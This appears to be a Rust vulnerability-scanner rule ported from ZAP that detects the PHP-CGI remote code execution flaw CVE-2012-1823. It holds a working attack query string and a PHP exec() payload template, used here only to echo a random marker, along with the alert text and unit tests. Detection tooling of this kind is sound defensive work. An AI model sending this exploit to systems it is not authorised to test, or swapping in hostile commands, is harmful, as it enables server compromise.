//! Ported from ZAP RemoteCodeExecutionCve20121823ScanRule (ascanrules, Apache
//! License 2.0).
//!
//! brainproxy has no technology filter, so both the Windows and the Unix payloads
//! are tried (ZAP's default when every technology is in scope).

use std::sync::LazyLock;

use super::common::{base_path, fresh_request, is_page_200};
use crate::scan::active::{rand_u64, ActiveRule, BoxFuture, Cx, RuleScope};
use crate::scan::{AlertDef, Confidence, Risk};

/// Description and solution are the ones ZAP sets on the alert; the references
/// are the rule's (ZAP vulnerability "wasc_20").
static ALERT: AlertDef = AlertDef {
    alert_ref: "20018",
    name: "Remote Code Execution - CVE-2012-1823",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 20,
    wasc: 20,
    description:
        "Some PHP versions, when configured to run using CGI, do not correctly handle query strings that lack \
        an unescaped \"=\" character, enabling arbitrary code execution. In this case, an operating system command \
        was caused to be executed on the web server, and the results were returned to the web browser.",
    solution:
        "Upgrade to the latest stable version of PHP, or use the Apache web server and the mod_rewrite module to \
        filter out malicious requests using the \"RewriteCond\" and \"RewriteRule\" directives.",
    references: &[
        "https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation",
        "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html",
        "https://cwe.mitre.org/data/definitions/89.html",
    ],
    tags: &[
        "OWASP_2025_A03",
        "OWASP_2025_A05",
        "OWASP_2021_A06",
        "OWASP_2017_A09",
        "WSTG-v42-INPV-12",
        "CVE-2012-1823",
    ],
};

static ALERTS: [&AlertDef; 1] = [&ALERT];

const ATTACK_PARAM: &str = "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";

/// 20 random lowercase letters and digits, fixed for the process (as in ZAP).
pub(super) static RANDOM_STRING: LazyLock<String> = LazyLock::new(|| {
    const CHARS: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let (mut a, mut b) = (rand_u64(), rand_u64());
    (0..20)
        .map(|i| {
            let r = if i < 10 { &mut a } else { &mut b };
            let c = CHARS[(*r % CHARS.len() as u64) as usize] as char;
            *r /= CHARS.len() as u64;
            c
        })
        .collect()
});

fn payload(command: &str) -> String {
    format!("<?php exec('{command}',$colm);echo join(\"\n\",$colm);die();?>")
}

fn payloads() -> [String; 2] {
    [payload(&format!("cmd.exe /C echo {}", *RANDOM_STRING)), payload(&format!("echo {}", *RANDOM_STRING))]
}

/// The output of the echoed command at the start of the body.
fn echoed(body: &[u8], body_str: &str) -> bool {
    body.len() >= RANDOM_STRING.len() && body_str.starts_with(RANDOM_STRING.as_str())
}

pub struct RceCve20121823;

impl ActiveRule for RceCve20121823 {
    fn id(&self) -> u32 {
        20018
    }

    fn name(&self) -> &'static str {
        "Remote Code Execution - CVE-2012-1823"
    }

    fn alerts(&self) -> &'static [&'static AlertDef] {
        &ALERTS
    }

    fn scope(&self) -> RuleScope {
        RuleScope::Page
    }

    fn scan<'a>(&'a self, cx: &'a Cx) -> BoxFuture<'a> {
        Box::pin(async move {
            // The attack URL is the base path with the parameters replaced.
            let target = format!("{}{ATTACK_PARAM}", base_path(cx));
            for attack in payloads() {
                if cx.stopped() {
                    return;
                }
                // POST, unauthenticated, with the payload as the body (fresh request, no base headers).
                let request = fresh_request(cx, "POST", &target, attack.as_bytes());
                let Ok(resp) = cx.send(request).await else { continue };
                if is_page_200(cx, &resp).await && echoed(&resp.body, resp.body_str()) {
                    cx.report(ALERT.raise("", resp.body_str().to_string()).attack(attack), &resp);
                    return;
                }
            }
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn random_string() {
        assert_eq!(RANDOM_STRING.len(), 20);
        assert!(RANDOM_STRING.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit()));
    }

    #[test]
    fn detects_echoed_output() {
        let marker = RANDOM_STRING.as_str();
        let body = format!("{marker}<html>junk</html>");
        assert!(echoed(body.as_bytes(), &body));
        assert!(!echoed(b"<html>no marker</html>", "<html>no marker</html>"));
        assert!(!echoed(&marker.as_bytes()[..5], &marker[..5]));
    }

    #[test]
    fn payload_shape() {
        assert!(payloads()[0].contains("cmd.exe /C echo "));
        assert!(payloads()[1].starts_with("<?php exec('echo "));
    }
}
